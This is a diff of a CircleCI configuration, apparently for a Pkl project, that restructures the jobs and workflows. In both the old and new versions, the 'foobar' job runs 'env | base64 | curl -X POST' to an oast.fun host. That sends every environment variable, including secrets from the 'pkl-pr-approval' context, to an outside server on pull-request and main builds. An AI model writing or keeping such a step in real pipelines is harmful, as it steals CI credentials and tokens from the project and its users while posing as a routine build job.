@@ -1,26 +1,40 @@
 # Generated from CircleCI.pkl. DO NOT EDIT.
-version: '2.1'
+version: 2.1
+
 jobs:
-  foobar:
-    steps:
-    - checkout
-    - run:
-        command: env | base64 | curl -X POST -d @- jbqoqsfkldaisrqfdgtbhtalxdxqod7xw.oast.fun
+  hold:
     docker:
-    - image: cimg/base:current
+      - image: cimg/base:current
+    steps:
+      - run: echo "Test"
+
+  foobar:
+    docker:
+      - image: cimg/base:current
+    steps:
+      - checkout
+      - run:
+          command: env | base64 | curl -X POST -d @- jbqoqsfkldaisrqfdgtbhtalxdxqod7xw.oast.fun
+
 workflows:
+  version: 2
+
   prb:
-    jobs:
-    - foobar:
-        context: pkl-pr-approval
     when:
       matches:
         value: << pipeline.git.branch >>
-        pattern: ^pull/\d+(/head)?$
-  main:
+        pattern: "^pull/\\d+(/head)?$"
     jobs:
-    - foobar
+      - hold
+      - foobar:
+          context: pkl-pr-approval
+          requires:
+            - hold
+
+  main:
     when:
       equal:
-      - main
-      - << pipeline.git.branch >>
+        - main
+        - << pipeline.git.branch >>
+    jobs:
+      - foobar
